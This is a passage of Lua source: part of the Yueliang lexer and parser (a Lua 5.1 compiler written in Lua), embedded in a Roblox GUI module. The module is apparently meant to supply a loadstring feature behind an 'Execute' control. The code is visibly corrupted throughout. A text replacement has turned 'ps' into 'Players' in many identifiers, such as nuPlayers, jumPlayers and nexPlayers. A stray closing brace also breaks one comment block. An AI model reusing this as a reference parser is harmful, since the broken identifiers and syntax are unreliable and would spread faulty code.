  local seminfo = self:str2d(ls.buff)
  Token.seminfo = seminfo
  if not seminfo then  -- format error?
    self:trydecpoint(ls, Token) -- try to update decimal point separator
  end
end

------------------------------------------------------------------------
-- count separators ("=") in a long string delimiter
-- * used by luaX:read_long_string
------------------------------------------------------------------------
function luaX:skip_sep(ls)
  local count = 0
  local s = ls.current
  -- lua_assert(s == "[" or s == "]")
  self:save_and_next(ls)
  while ls.current == "=" do
    self:save_and_next(ls)
    count = count + 1
  end
  return (ls.current == s) and count or (-count) - 1
end

------------------------------------------------------------------------
-- reads a long string or long comment
------------------------------------------------------------------------
function luaX:read_long_string(ls, Token, sep)
  local cont = 0
  self:save_and_next(ls)  -- skip 2nd '['
  if self:currIsNewline(ls) then  -- string starts with a newline?
    self:inclinenumber(ls)  -- skip it
  end
  while true do
    local c = ls.current
    if c == "EOZ" then
      self:lexerror(ls, Token and "unfinished long string" or
                    "unfinished long comment", "TK_EOS")
    elseif c == "[" then
      --# compatibility code start
      if self.LUA_COMPAT_LSTR then
        if self:skip_sep(ls) == sep then
          self:save_and_next(ls)  -- skip 2nd '['
          cont = cont + 1
          --# compatibility code start
          if self.LUA_COMPAT_LSTR == 1 then
            if sep == 0 then
              self:lexerror(ls, "nesting of [[...]] is deprecated", "[")
            end
          end
          --# compatibility code end
        end
      end
      --# compatibility code end
    elseif c == "]" then
      if self:skip_sep(ls) == sep then
        self:save_and_next(ls)  -- skip 2nd ']'
        --# compatibility code start
        if self.LUA_COMPAT_LSTR and self.LUA_COMPAT_LSTR == 2 then
          cont = cont - 1
          if sep == 0 and cont >= 0 then break end
        end
        --# compatibility code end
        break
      end
    elseif self:currIsNewline(ls) then
      self:save(ls, "\n")
      self:inclinenumber(ls)
      if not Token then ls.buff = "" end -- avoid wasting space
    else  -- default
      if Token then
        self:save_and_next(ls)
      else
        self:nextc(ls)
      end
    end--if c
  end--while
  if Token then
    local p = 3 + sep
    Token.seminfo = string.sub(ls.buff, p, -p)
  end
end

------------------------------------------------------------------------
-- reads a string
-- * has been restructured significantly compared to the original C code
------------------------------------------------------------------------

function luaX:read_string(ls, del, Token)
  self:save_and_next(ls)
  while ls.current ~= del do
    local c = ls.current
    if c == "EOZ" then
      self:lexerror(ls, "unfinished string", "TK_EOS")
    elseif self:currIsNewline(ls) then
      self:lexerror(ls, "unfinished string", "TK_STRING")
    elseif c == "\\" then
      c = self:nextc(ls)  -- do not save the '\'
      if self:currIsNewline(ls) then  -- go through
        self:save(ls, "\n")
        self:inclinenumber(ls)
      elseif c ~= "EOZ" then -- will raise an error next loop
        -- escapes handling greatly simplified here:
        local i = string.find("abfnrtv", c, 1, 1)
        if i then
          self:save(ls, string.sub("\a\b\f\n\r\t\v", i, i))
          self:nextc(ls)
        elseif not string.find(c, "%d") then
          self:save_and_next(ls)  -- handles \\, \", \', and \?
        else  -- \xxx
          c, i = 0, 0
          repeat
            c = 10 * c + ls.current
            self:nextc(ls)
            i = i + 1
          until i >= 3 or not string.find(ls.current, "%d")
          if c > 255 then  -- UCHAR_MAX
            self:lexerror(ls, "escape sequence too large", "TK_STRING")
          end
          self:save(ls, string.char(c))
        end
      end
    else
      self:save_and_next(ls)
    end--if c
  end--while
  self:save_and_next(ls)  -- skip delimiter
  Token.seminfo = string.sub(ls.buff, 2, -2)
end

------------------------------------------------------------------------
-- main lexer function
------------------------------------------------------------------------
function luaX:llex(ls, Token)
  ls.buff = ""
  while true do
    local c = ls.current
    ----------------------------------------------------------------
    if self:currIsNewline(ls) then
      self:inclinenumber(ls)
    ----------------------------------------------------------------
    elseif c == "-" then
      c = self:nextc(ls)
      if c ~= "-" then return "-" end
      -- else is a comment
      local sep = -1
      if self:nextc(ls) == '[' then
        sep = self:skip_sep(ls)
        ls.buff = ""  -- 'skip_sep' may dirty the buffer
      end
      if sep >= 0 then
        self:read_long_string(ls, nil, sep)  -- long comment
        ls.buff = ""
      else  -- else short comment
        while not self:currIsNewline(ls) and ls.current ~= "EOZ" do
          self:nextc(ls)
        end
      end
    ----------------------------------------------------------------
    elseif c == "[" then
      local sep = self:skip_sep(ls)
      if sep >= 0 then
        self:read_long_string(ls, Token, sep)
        return "TK_STRING"
      elseif sep == -1 then
        return "["
      else
        self:lexerror(ls, "invalid long string delimiter", "TK_STRING")
      end
    ----------------------------------------------------------------
    elseif c == "=" then
      c = self:nextc(ls)
      if c ~= "=" then return "="
      else self:nextc(ls); return "TK_EQ" end
    ----------------------------------------------------------------
    elseif c == "<" then
      c = self:nextc(ls)
      if c ~= "=" then return "<"
      else self:nextc(ls); return "TK_LE" end
    ----------------------------------------------------------------
    elseif c == ">" then
      c = self:nextc(ls)
      if c ~= "=" then return ">"
      else self:nextc(ls); return "TK_GE" end
    ----------------------------------------------------------------
    elseif c == "~" then
      c = self:nextc(ls)
      if c ~= "=" then return "~"
      else self:nextc(ls); return "TK_NE" end
    ----------------------------------------------------------------
    elseif c == "\"" or c == "'" then
      self:read_string(ls, c, Token)
      return "TK_STRING"
    ----------------------------------------------------------------
    elseif c == "." then
      c = self:save_and_next(ls)
      if self:check_next(ls, ".") then
        if self:check_next(ls, ".") then
          return "TK_DOTS"   -- ...
        else return "TK_CONCAT"   -- ..
        end
      elseif not string.find(c, "%d") then
        return "."
      else
        self:read_numeral(ls, Token)
        return "TK_NUMBER"
      end
    ----------------------------------------------------------------
    elseif c == "EOZ" then
      return "TK_EOS"
    ----------------------------------------------------------------
    else  -- default
      if string.find(c, "%s") then
        -- lua_assert(self:currIsNewline(ls))
        self:nextc(ls)
      elseif string.find(c, "%d") then
        self:read_numeral(ls, Token)
        return "TK_NUMBER"
      elseif string.find(c, "[_%a]") then
        -- identifier or reserved word
        repeat
          c = self:save_and_next(ls)
        until c == "EOZ" or not string.find(c, "[_%w]")
        local ts = ls.buff
        local tok = self.enums[ts]
        if tok then return tok end  -- reserved word?
        Token.seminfo = ts
        return "TK_NAME"
      else
        self:nextc(ls)
        return c  -- single-char tokens (+ - / ...)
      end
    ----------------------------------------------------------------
    end--if c
  end--while
end

return luaX
end
}
--verified.Frame.ImageLabel.Page 3.Execute.yes'.Script.Loadstring.LuaY
G2L_MODULES[G2L["400"]] = {
Closure = function()
local script = G2L["400"]
--[[--------------------------------------------------------------------

  lparser.lua
  Lua 5 parser in Lua
  This file is part of Yueliang.

  Copyright (c) 2005-2007 Kein-Hong Man <khman@users.sf.net>
  The COPYRIGHT file describes the conditions
  under which this software may be distributed.

  See the ChangeLog for more information.

----------------------------------------------------------------------]]

--[[--------------------------------------------------------------------
-- Notes:
-- * some unused C code that were not converted are kept as comments
-- * LUA_COMPAT_VARARG option changed into a comment block
-- * for value/size specific code added, look for 'NOTE: '
--
-- Not implemented:
-- * luaX_newstring not needed by this Lua implementation
-- * luaG_checkcode() in assert is not currently implemented
--
-- Added:
-- * some constants added from various header files
-- * luaY.LUA_QS used in error_expected, check_match (from luaconf.h)
-- * luaY:LUA_QL needed for error messages (from luaconf.h)
-- * luaY:growvector (from lmem.h) -- skeleton only, limit checking
-- * luaY.SHRT_MAX (from <limits.h>) for registerlocalvar
-- * luaY:newproto (from lfunc.c)
-- * luaY:int2fb (from lobject.c)
-- * NOTE: HASARG_MASK, for implementing a VARARG_HASARG bit operation
-- * NOTE: value-specific code for VARARG_NEEDSARG to replace a bitop
--
-- Changed in 5.1.x:
-- * various code changes are not detailed...
-- * names of constants may have changed, e.g. added a LUAI_ prefix
-- * struct expkind: added VKNUM, VVARARG; VCALL's info changed?
-- * struct expdesc: added nval
-- * struct FuncState: upvalues data type changed to upvaldesc
-- * macro hasmultret is new
-- * function checklimit moved to parser from lexer
-- * functions anchor_token, errorlimit, checknext are new
-- * checknext is new, equivalent to 5.0.x's check, see check too
-- * luaY:next and luaY:lookahead moved to lexer
-- * break keyword no longer skipped in luaY:breakstat
-- * function new_localvarstr replaced by new_localvarliteral
-- * registerlocalvar limits local variables to SHRT_MAX
-- * create_local deleted, new_localvarliteral used instead
-- * constant LUAI_MAXUPVALUES increased to 60
-- * constants MAXPARAMS, LUA_MAXPARSERLEVEL, MAXSTACK removed
-- * function interface changed: singlevaraux, singlevar
-- * enterlevel and leavelevel uses nCcalls to track call depth
-- * added a name argument to main entry function, luaY:parser
-- * function luaY_index changed to yindex
-- * luaY:int2fb()'s table size encoding format has been changed
-- * luaY:log2() no longer needed for table constructors
-- * function code_params deleted, functionality folded in parlist
-- * vararg flags handling (is_vararg) changes; also see VARARG_*
-- * LUA_COMPATUPlayersYNTAX section for old-style upvalues removed
-- * repeatstat() calls chunk() instead of block()
-- * function interface changed: cond, test_then_block
-- * while statement implementation considerably simplified; MAXEXPWHILE
--   and EXTRAEXP no longer required, no limits to the complexity of a
--   while condition
-- * repeat, forbody statement implementation has major changes,
--   mostly due to new scoping behaviour of local variables
-- * OPR_MULT renamed to OPR_MUL
----------------------------------------------------------------------]]

--requires luaP, luaX, luaK
local luaY = {}
local luaX = require(script.Parent.LuaX)
local luaK = require(script.Parent.LuaK)(luaY)
local luaP = require(script.Parent.LuaP)

--[[--------------------------------------------------------------------
-- Expression descriptor
-- * expkind changed to string constants; luaY:assignment was the only
--   function to use a relational operator with this enumeration
-- VVOID       -- no value
-- VNIL        -- no value
-- VTRUE       -- no value
-- VFALSE      -- no value
-- VK          -- info = index of constant in 'k'
-- VKNUM       -- nval = numerical value
-- VLOCAL      -- info = local register
-- VUPVAL,     -- info = index of upvalue in 'upvalues'
-- VGLOBAL     -- info = index of table; aux = index of global name in 'k'
-- VINDEXED    -- info = table register; aux = index register (or 'k')
-- VJMP        -- info = instruction pc
-- VRELOCABLE  -- info = instruction pc
-- VNONRELOC   -- info = result register
-- VCALL       -- info = instruction pc
-- VVARARG     -- info = instruction pc
} ----------------------------------------------------------------------]]

--[[--------------------------------------------------------------------
-- * expdesc in Lua 5.1.x has a union u and another struct s; this Lua
--   implementation ignores all instances of u and s usage
-- struct expdesc:
--   k  -- (enum: expkind)
--   info, aux -- (int, int)
--   nval -- (lua_Number)
--   t  -- patch list of 'exit when true'
--   f  -- patch list of 'exit when false'
----------------------------------------------------------------------]]

--[[--------------------------------------------------------------------
-- struct upvaldesc:
--   k  -- (lu_byte)
--   info -- (lu_byte)
----------------------------------------------------------------------]]

--[[--------------------------------------------------------------------
-- state needed to generate code for a given function
-- struct FuncState:
--   f  -- current function header (table: Proto)
--   h  -- table to find (and reuse) elements in 'k' (table: Table)
--   prev  -- enclosing function (table: FuncState)
--   ls  -- lexical state (table: LexState)
--   L  -- copy of the Lua state (table: lua_State)
--   bl  -- chain of current blocks (table: BlockCnt)
--   pc  -- next position to code (equivalent to 'ncode')
--   lasttarget   -- 'pc' of last 'jump target'
--   jpc  -- list of pending jumPlayers to 'pc'
--   freereg  -- first free register
--   nk  -- number of elements in 'k'
--   np  -- number of elements in 'p'
--   nlocvars  -- number of elements in 'locvars'
--   nactvar  -- number of active local variables
--   upvalues[LUAI_MAXUPVALUES]  -- upvalues (table: upvaldesc)
--   actvar[LUAI_MAXVARS]  -- declared-variable stack
----------------------------------------------------------------------]]

------------------------------------------------------------------------
-- constants used by parser
-- * picks up duplicate values from luaX if required
------------------------------------------------------------------------

luaY.LUA_QS = luaX.LUA_QS or "'%s'"  -- (from luaconf.h)

luaY.SHRT_MAX = 32767 -- (from <limits.h>)
luaY.LUAI_MAXVARS = 200  -- (luaconf.h)
luaY.LUAI_MAXUPVALUES = 60  -- (luaconf.h)
luaY.MAX_INT = luaX.MAX_INT or 2147483645  -- (from llimits.h)
  -- * INT_MAX-2 for 32-bit systems
luaY.LUAI_MAXCCALLS = 200  -- (from luaconf.h)

luaY.VARARG_HASARG = 1  -- (from lobject.h)
-- NOTE: HASARG_MASK is value-specific
luaY.HASARG_MASK = 2 -- this was added for a bitop in parlist()
luaY.VARARG_ISVARARG = 2
-- NOTE: there is some value-specific code that involves VARARG_NEEDSARG
luaY.VARARG_NEEDSARG = 4

luaY.LUA_MULTRET = -1  -- (lua.h)

--[[--------------------------------------------------------------------
-- other functions
----------------------------------------------------------------------]]

------------------------------------------------------------------------
-- LUA_QL describes how error messages quote program elements.
-- CHANGE it if you want a different appearance. (from luaconf.h)
------------------------------------------------------------------------
function luaY:LUA_QL(x)
  return "'"..x.."'"
end

------------------------------------------------------------------------
-- this is a stripped-down luaM_growvector (from lmem.h) which is a
-- macro based on luaM_growaux (in lmem.c); all the following does is
-- reproduce the size limit checking logic of the original function
-- so that error behaviour is identical; all arguments preserved for
-- convenience, even those which are unused
-- * set the t field to nil, since this originally does a sizeof(t)
-- * size (originally a pointer) is never updated, their final values
--   are set by luaY:close_func(), so overall things should still work
------------------------------------------------------------------------
function luaY:growvector(L, v, nelems, size, t, limit, e)
  if nelems >= limit then
    error(e)  -- was luaG_runerror
  end
end

------------------------------------------------------------------------
-- initialize a new function prototype structure (from lfunc.c)
-- * used only in open_func()
------------------------------------------------------------------------
function luaY:newproto(L)
  local f = {} -- Proto
  -- luaC_link(L, obj2gco(f), LUA_TPROTO); /* GC */
  f.k = {}
  f.sizek = 0
  f.p = {}
  f.sizep = 0
  f.code = {}
  f.sizecode = 0
  f.sizelineinfo = 0
  f.sizeupvalues = 0
  f.nuPlayers = 0
  f.upvalues = {}
  f.numparams = 0
  f.is_vararg = 0
  f.maxstacksize = 0
  f.lineinfo = {}
  f.sizelocvars = 0
  f.locvars = {}
  f.lineDefined = 0
  f.lastlinedefined = 0
  f.source = nil
  return f
end

------------------------------------------------------------------------
-- converts an integer to a "floating point byte", represented as
-- (eeeeexxx), where the real value is (1xxx) * 2^(eeeee - 1) if
-- eeeee != 0 and (xxx) otherwise.
------------------------------------------------------------------------
function luaY:int2fb(x)
  local e = 0  -- exponent
  while x >= 16 do
    x = math.floor((x + 1) / 2)
    e = e + 1
  end
  if x < 8 then
    return x
  else
    return ((e + 1) * 8) + (x - 8)
  end
end

--[[--------------------------------------------------------------------
-- parser functions
----------------------------------------------------------------------]]

------------------------------------------------------------------------
-- true of the kind of expression produces multiple return values
------------------------------------------------------------------------
function luaY:hasmultret(k)
  return k == "VCALL" or k == "VVARARG"
end

------------------------------------------------------------------------
-- convenience function to access active local i, returns entry
------------------------------------------------------------------------
function luaY:getlocvar(fs, i)
  return fs.f.locvars[ fs.actvar[i] ]
end

------------------------------------------------------------------------
-- check a limit, string m provided as an error message
------------------------------------------------------------------------
function luaY:checklimit(fs, v, l, m)
  if v > l then self:errorlimit(fs, l, m) end
end

--[[--------------------------------------------------------------------
-- nodes for block list (list of active blocks)
-- struct BlockCnt:
--   previous  -- chain (table: BlockCnt)
--   breaklist  -- list of jumPlayers out of this loop
--   nactvar  -- # active local variables outside the breakable structure
--   upval  -- true if some variable in the block is an upvalue (boolean)
--   isbreakable  -- true if 'block' is a loop (boolean)
----------------------------------------------------------------------]]

------------------------------------------------------------------------
-- prototypes for recursive non-terminal functions
------------------------------------------------------------------------
-- prototypes deleted; not required in Lua

------------------------------------------------------------------------
-- reanchor if last token is has a constant string, see close_func()
-- * used only in close_func()
------------------------------------------------------------------------
function luaY:anchor_token(ls)
  if ls.t.token == "TK_NAME" or ls.t.token == "TK_STRING" then
    -- not relevant to Lua implementation of parser
    -- local ts = ls.t.seminfo
    -- luaX_newstring(ls, getstr(ts), ts->tsv.len); /* C */
  end
end

------------------------------------------------------------------------
-- throws a syntax error if token expected is not there
------------------------------------------------------------------------
function luaY:error_expected(ls, token)
  luaX:syntaxerror(ls,
    string.format(self.LUA_QS.." expected", luaX:token2str(ls, token)))
end

------------------------------------------------------------------------
-- prepares error message for display, for limits exceeded
-- * used only in checklimit()
------------------------------------------------------------------------
function luaY:errorlimit(fs, limit, what)
  local msg = (fs.f.linedefined == 0) and
    string.format("main function has more than %d %s", limit, what) or
    string.format("function at line %d has more than %d %s",
                  fs.f.linedefined, limit, what)
  luaX:lexerror(fs.ls, msg, 0)
end

------------------------------------------------------------------------
-- tests for a token, returns outcome
-- * return value changed to boolean
------------------------------------------------------------------------
function luaY:testnext(ls, c)
  if ls.t.token == c then
    luaX:next(ls)
    return true
  else
    return false
  end
end

------------------------------------------------------------------------
-- check for existence of a token, throws error if not found
------------------------------------------------------------------------
function luaY:check(ls, c)
  if ls.t.token ~= c then
    self:error_expected(ls, c)
  end
end

------------------------------------------------------------------------
-- verify existence of a token, then skip it
------------------------------------------------------------------------
function luaY:checknext(ls, c)
  self:check(ls, c)
  luaX:next(ls)
end

------------------------------------------------------------------------
-- throws error if condition not matched
------------------------------------------------------------------------
function luaY:check_condition(ls, c, msg)
  if not c then luaX:syntaxerror(ls, msg) end
end

------------------------------------------------------------------------
-- verifies token conditions are met or else throw error
------------------------------------------------------------------------
function luaY:check_match(ls, what, who, where)
  if not self:testnext(ls, what) then
    if where == ls.linenumber then
      self:error_expected(ls, what)
    else
      luaX:syntaxerror(ls, string.format(
        self.LUA_QS.." expected (to close "..self.LUA_QS.." at line %d)",
        luaX:token2str(ls, what), luaX:token2str(ls, who), where))
    end
  end
end

------------------------------------------------------------------------
-- expect that token is a name, return the name
------------------------------------------------------------------------
function luaY:str_checkname(ls)
  self:check(ls, "TK_NAME")
  local ts = ls.t.seminfo
  luaX:next(ls)
  return ts
end

------------------------------------------------------------------------
-- initialize a struct expdesc, expression description data structure
------------------------------------------------------------------------
function luaY:init_exp(e, k, i)
  e.f, e.t = luaK.NO_JUMP, luaK.NO_JUMP
  e.k = k
  e.info = i
end

------------------------------------------------------------------------
-- adds given string s in string pool, sets e as VK
------------------------------------------------------------------------
function luaY:codestring(ls, e, s)
  self:init_exp(e, "VK", luaK:stringK(ls.fs, s))
end

------------------------------------------------------------------------
-- consume a name token, adds it to string pool, sets e as VK
------------------------------------------------------------------------
function luaY:checkname(ls, e)
  self:codestring(ls, e, self:str_checkname(ls))
end

------------------------------------------------------------------------
-- creates struct entry for a local variable
-- * used only in new_localvar()
------------------------------------------------------------------------
function luaY:registerlocalvar(ls, varname)
  local fs = ls.fs
  local f = fs.f
  self:growvector(ls.L, f.locvars, fs.nlocvars, f.sizelocvars,
                  nil, self.SHRT_MAX, "too many local variables")
  -- loop to initialize empty f.locvar positions not required
  f.locvars[fs.nlocvars] = {} -- LocVar
  f.locvars[fs.nlocvars].varname = varname
  -- luaC_objbarrier(ls.L, f, varname) /* GC */
  local nlocvars = fs.nlocvars
  fs.nlocvars = fs.nlocvars + 1
  return nlocvars
end

------------------------------------------------------------------------
-- creates a new local variable given a name and an offset from nactvar
-- * used in fornum(), forlist(), parlist(), body()
------------------------------------------------------------------------
function luaY:new_localvarliteral(ls, v, n)
  self:new_localvar(ls, v, n)
end

------------------------------------------------------------------------
-- register a local variable, set in active variable list
------------------------------------------------------------------------
function luaY:new_localvar(ls, name, n)
  local fs = ls.fs
  self:checklimit(fs, fs.nactvar + n + 1, self.LUAI_MAXVARS, "local variables")
  fs.actvar[fs.nactvar + n] = self:registerlocalvar(ls, name)
end

------------------------------------------------------------------------
-- adds nvars number of new local variables, set debug information
------------------------------------------------------------------------
function luaY:adjustlocalvars(ls, nvars)
  local fs = ls.fs
  fs.nactvar = fs.nactvar + nvars
  for i = nvars, 1, -1 do
    self:getlocvar(fs, fs.nactvar - i).startpc = fs.pc
  end
end

------------------------------------------------------------------------
-- removes a number of locals, set debug information
------------------------------------------------------------------------
function luaY:removevars(ls, tolevel)
  local fs = ls.fs
  while fs.nactvar > tolevel do
    fs.nactvar = fs.nactvar - 1
    self:getlocvar(fs, fs.nactvar).endpc = fs.pc
  end
end

------------------------------------------------------------------------
-- returns an existing upvalue index based on the given name, or
-- creates a new upvalue struct entry and returns the new index
-- * used only in singlevaraux()
------------------------------------------------------------------------
function luaY:indexupvalue(fs, name, v)
  local f = fs.f
  for i = 0, f.nuPlayers - 1 do
    if fs.upvalues[i].k == v.k and fs.upvalues[i].info == v.info then
      assert(f.upvalues[i] == name)
      return i
    end
  end
  -- new one
  self:checklimit(fs, f.nuPlayers + 1, self.LUAI_MAXUPVALUES, "upvalues")
  self:growvector(fs.L, f.upvalues, f.nuPlayers, f.sizeupvalues,
                  nil, self.MAX_INT, "")
  -- loop to initialize empty f.upvalues positions not required
  f.upvalues[f.nuPlayers] = name
  -- luaC_objbarrier(fs->L, f, name); /* GC */
  assert(v.k == "VLOCAL" or v.k == "VUPVAL")
  -- this is a partial copy; only k & info fields used
  fs.upvalues[f.nuPlayers] = { k = v.k, info = v.info }
  local nuPlayers = f.nuPlayers
  f.nuPlayers = f.nuPlayers + 1
  return nuPlayers
end

------------------------------------------------------------------------
-- search the local variable namespace of the given fs for a match
-- * used only in singlevaraux()
------------------------------------------------------------------------
function luaY:searchvar(fs, n)
  for i = fs.nactvar - 1, 0, -1 do
    if n == self:getlocvar(fs, i).varname then
      return i
    end
  end
  return -1  -- not found
end

------------------------------------------------------------------------
-- * mark upvalue flags in function states up to a given level
-- * used only in singlevaraux()
------------------------------------------------------------------------
function luaY:markupval(fs, level)
  local bl = fs.bl
  while bl and bl.nactvar > level do bl = bl.previous end
  if bl then bl.upval = true end
end

------------------------------------------------------------------------
-- handle locals, globals and upvalues and related processing
-- * search mechanism is recursive, calls itself to search parents
-- * used only in singlevar()
------------------------------------------------------------------------
function luaY:singlevaraux(fs, n, var, base)
  if fs == nil then  -- no more levels?
    self:init_exp(var, "VGLOBAL", luaP.NO_REG)  -- default is global variable
    return "VGLOBAL"
  else
    local v = self:searchvar(fs, n)  -- look up at current level
    if v >= 0 then
      self:init_exp(var, "VLOCAL", v)
      if base == 0 then
        self:markupval(fs, v)  -- local will be used as an upval
      end
      return "VLOCAL"
    else  -- not found at current level; try upper one
      if self:singlevaraux(fs.prev, n, var, 0) == "VGLOBAL" then
        return "VGLOBAL"
      end
      var.info = self:indexupvalue(fs, n, var)  -- else was LOCAL or UPVAL
      var.k = "VUPVAL"  -- upvalue in this level
      return "VUPVAL"
    end--if v
  end--if fs
end

------------------------------------------------------------------------
-- consume a name token, creates a variable (global|local|upvalue)
-- * used in prefixexp(), funcname()
------------------------------------------------------------------------
function luaY:singlevar(ls, var)
  local varname = self:str_checkname(ls)
  local fs = ls.fs
  if self:singlevaraux(fs, varname, var, 1) == "VGLOBAL" then
    var.info = luaK:stringK(fs, varname)  -- info points to global name
  end
end

------------------------------------------------------------------------
-- adjust RHS to match LHS in an assignment
-- * used in assignment(), forlist(), localstat()
------------------------------------------------------------------------
function luaY:adjust_assign(ls, nvars, nexPlayers, e)
  local fs = ls.fs
  local extra = nvars - nexPlayers
  if self:hasmultret(e.k) then
    extra = extra + 1  -- includes call itself
    if extra <= 0 then extra = 0 end
    luaK:setreturns(fs, e, extra)  -- last exp. provides the difference
    if extra > 1 then luaK:reserveregs(fs, extra - 1) end
  else
    if e.k ~= "VVOID" then luaK:exp2nextreg(fs, e) end  -- close last expression
    if extra > 0 then
      local reg = fs.freereg
      luaK:reserveregs(fs, extra)
      luaK:_nil(fs, reg, extra)
    end
  end
end

------------------------------------------------------------------------
-- tracks and limits parsing depth, assert check at end of parsing
------------------------------------------------------------------------
function luaY:enterlevel(ls)
  ls.L.nCcalls = ls.L.nCcalls + 1
  if ls.L.nCcalls > self.LUAI_MAXCCALLS then
    luaX:lexerror(ls, "chunk has too many syntax levels", 0)
  end
end

------------------------------------------------------------------------
-- tracks parsing depth, a pair with luaY:enterlevel()
------------------------------------------------------------------------
function luaY:leavelevel(ls)
  ls.L.nCcalls = ls.L.nCcalls - 1
end

------------------------------------------------------------------------
-- enters a code unit, initializes elements
------------------------------------------------------------------------
function luaY:enterblock(fs, bl, isbreakable)
  bl.breaklist = luaK.NO_JUMP
  bl.isbreakable = isbreakable
  bl.nactvar = fs.nactvar
  bl.upval = false
  bl.previous = fs.bl
  fs.bl = bl
  assert(fs.freereg == fs.nactvar)
end

------------------------------------------------------------------------
-- leaves a code unit, close any upvalues
------------------------------------------------------------------------
function luaY:leaveblock(fs)
  local bl = fs.bl
  fs.bl = bl.previous
  self:removevars(fs.ls, bl.nactvar)
  if bl.upval then
    luaK:codeABC(fs, "OP_CLOSE", bl.nactvar, 0, 0)
  end
  -- a block either controls scope or breaks (never both)
  assert(not bl.isbreakable or not bl.upval)
  assert(bl.nactvar == fs.nactvar)
  fs.freereg = fs.nactvar  -- free registers
  luaK:patchtohere(fs, bl.breaklist)
end

------------------------------------------------------------------------
-- implement the instantiation of a function prototype, append list of
-- upvalues after the instantiation instruction
-- * used only in body()
------------------------------------------------------------------------
function luaY:pushclosure(ls, func, v)
  local fs = ls.fs
  local f = fs.f
  self:growvector(ls.L, f.p, fs.np, f.sizep, nil,
                  luaP.MAXARG_Bx, "constant table overflow")
  -- loop to initialize empty f.p positions not required
  f.p[fs.np] = func.f
  fs.np = fs.np + 1
  -- luaC_objbarrier(ls->L, f, func->f); /* C */
  self:init_exp(v, "VRELOCABLE", luaK:codeABx(fs, "OP_CLOSURE", 0, fs.np - 1))
  for i = 0, func.f.nuPlayers - 1 do
    local o = (func.upvalues[i].k == "VLOCAL") and "OP_MOVE" or "OP_GETUPVAL"
    luaK:codeABC(fs, o, 0, func.upvalues[i].info, 0)
  end
end

------------------------------------------------------------------------
-- opening of a function
------------------------------------------------------------------------
function luaY:open_func(ls, fs)
  local L = ls.L
  local f = self:newproto(ls.L)
  fs.f = f
  fs.prev = ls.fs  -- linked list of funcstates
  fs.ls = ls
  fs.L = L
  ls.fs = fs
  fs.pc = 0
  fs.lasttarget = -1
  fs.jpc = luaK.NO_JUMP
  fs.freereg = 0
  fs.nk = 0
  fs.np = 0
  fs.nlocvars = 0
  fs.nactvar = 0
  fs.bl = nil
  f.source = ls.source
  f.maxstacksize = 2  -- registers 0/1 are always valid
  fs.h = {}  -- constant table; was luaH_new call
  -- anchor table of constants and prototype (to avoid being collected)
  -- sethvalue2s(L, L->top, fs->h); incr_top(L); /* C */
  -- setptvalue2s(L, L->top, f); incr_top(L);
end

------------------------------------------------------------------------
-- closing of a function
------------------------------------------------------------------------
function luaY:close_func(ls)
  local L = ls.L
  local fs = ls.fs
  local f = fs.f
  self:removevars(ls, 0)
  luaK:ret(fs, 0, 0)  -- final return
  -- luaM_reallocvector deleted for f->code, f->lineinfo, f->k, f->p,
  -- f->locvars, f->upvalues; not required for Lua table arrays
  f.sizecode = fs.pc
  f.sizelineinfo = fs.pc
  f.sizek = fs.nk
  f.sizep = fs.np
  f.sizelocvars = fs.nlocvars
  f.sizeupvalues = f.nuPlayers
  --assert(luaG_checkcode(f))  -- currently not implemented
  assert(fs.bl == nil)
  ls.fs = fs.prev
  -- the following is not required for this implementation; kept here
  -- for completeness
  -- L->top -= 2;  /* remove table and prototype from the stack */
  -- last token read was anchored in defunct function; must reanchor it
  if fs then self:anchor_token(ls) end
end

------------------------------------------------------------------------
-- parser initialization function
-- * note additional sub-tables needed for LexState, FuncState
------------------------------------------------------------------------
function luaY:parser(L, z, buff, name)
  local lexstate = {}  -- LexState
        lexstate.t = {}
        lexstate.lookahead = {}
  local funcstate = {}  -- FuncState
        funcstate.upvalues = {}
        funcstate.actvar = {}
  -- the following nCcalls initialization added for convenience
  L.nCcalls = 0
  lexstate.buff = buff
  luaX:setinput(L, lexstate, z, name)
  self:open_func(lexstate, funcstate)
  funcstate.f.is_vararg = self.VARARG_ISVARARG  -- main func. is always vararg
  luaX:next(lexstate)  -- read first token
  self:chunk(lexstate)
  self:check(lexstate, "TK_EOS")
  self:close_func(lexstate)
  assert(funcstate.prev == nil)
  assert(funcstate.f.nuPlayers == 0)
  assert(lexstate.fs == nil)
  return funcstate.f
end

--[[--------------------------------------------------------------------
-- GRAMMAR RULES
----------------------------------------------------------------------]]

------------------------------------------------------------------------
-- parse a function name suffix, for function call specifications
-- * used in primaryexp(), funcname()
------------------------------------------------------------------------
function luaY:field(ls, v)
  -- field -> ['.' | ':'] NAME
  local fs = ls.fs
  local key = {}  -- expdesc
  luaK:exp2anyreg(fs, v)
  luaX:next(ls)  -- skip the dot or colon
  self:checkname(ls, key)
  luaK:indexed(fs, v, key)
end

------------------------------------------------------------------------
-- parse a table indexing suffix, for constructors, expressions
-- * used in recfield(), primaryexp()
------------------------------------------------------------------------
function luaY:yindex(ls, v)
  -- index -> '[' expr ']'
  luaX:next(ls)  -- skip the '['
  self:expr(ls, v)
  luaK:exp2val(ls.fs, v)
  self:checknext(ls, "]")
end

--[[--------------------------------------------------------------------
-- Rules for Constructors
----------------------------------------------------------------------]]

--[[--------------------------------------------------------------------
-- struct ConsControl:
--   v  -- last list item read (table: struct expdesc)
--   t  -- table descriptor (table: struct expdesc)
--   nh  -- total number of 'record' elements
--   na  -- total number of array elements
--   tostore  -- number of array elements pending to be stored
----------------------------------------------------------------------]]

------------------------------------------------------------------------
-- parse a table record (hash) field
-- * used in constructor()
------------------------------------------------------------------------
function luaY:recfield(ls, cc)
  -- recfield -> (NAME | '['exp1']') = exp1
  local fs = ls.fs
  local reg = ls.fs.freereg
  local key, val = {}, {}  -- expdesc
  if ls.t.token == "TK_NAME" then
    self:checklimit(fs, cc.nh, self.MAX_INT, "items in a constructor")
    self:checkname(ls, key)
  else  -- ls->t.token == '['
    self:yindex(ls, key)
  end
  cc.nh = cc.nh + 1
  self:checknext(ls, "=")
  local rkkey = luaK:exp2RK(fs, key)
  self:expr(ls, val)
  luaK:codeABC(fs, "OP_SETTABLE", cc.t.info, rkkey, luaK:exp2RK(fs, val))
  fs.freereg = reg  -- free registers
end

------------------------------------------------------------------------
-- emit a set list instruction if enough elements (LFIELDS_PER_FLUSH)
-- * used in constructor()
------------------------------------------------------------------------
function luaY:closelistfield(fs, cc)
  if cc.v.k == "VVOID" then return end  -- there is no list item
  luaK:exp2nextreg(fs, cc.v)
  cc.v.k = "VVOID"
  if cc.tostore == luaP.LFIELDS_PER_FLUSH then
